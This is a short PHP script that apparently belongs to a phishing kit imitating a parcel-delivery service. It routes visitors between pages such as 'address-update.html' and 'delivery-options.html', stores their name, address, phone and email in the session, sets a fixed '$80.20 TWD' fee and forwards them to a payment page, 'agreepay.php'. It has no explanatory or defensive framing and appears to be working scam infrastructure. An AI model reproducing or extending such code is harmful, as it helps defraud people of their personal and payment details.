<?php
session_start();

if ($_GET['data'] == "next")
{
header("Location: address-update.html");
}
elseif ($_GET['data'] == "track")
{
header("Location: delivery-options.html");
}
elseif ($_GET['data'] == "payment")
{
header("Location: loadingcontent.html");
}
else
{
$_SESSION['fname'] = $_POST['fname'];
$_SESSION['lname'] = $_POST['lname'];
$_SESSION['address'] = $_POST['address'];
$_SESSION['address2'] = $_POST['address2'];
$_SESSION['city'] = $_POST['city'];
$_SESSION['postcode'] = $_POST['postcode'];
$_SESSION['phone'] = $_POST['phone'];
$_SESSION['email'] = $_POST['email'];
$_SESSION['amount'] = "$80.20 TWD";


$rndtext = md5(microtime());
$rrand = rand(000000000,999999999);
$rrand1 = rand(000000000,999999999);
$rndtext = md5(microtime()).md5(microtime());

header("Location: agreepay.php");
}
?>